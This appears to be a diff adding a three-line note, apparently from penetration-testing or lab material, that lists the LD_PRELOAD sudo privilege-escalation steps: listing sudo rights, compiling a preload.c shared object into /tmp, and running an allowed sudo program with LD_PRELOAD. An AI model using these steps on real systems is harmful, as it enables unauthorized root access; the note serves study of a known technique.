@@ -1,0 +1,3 @@
+1. sudo -l
+2. gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+3. sudo LD_PRELOAD=/tmp/preload.so {any sudo -l program}
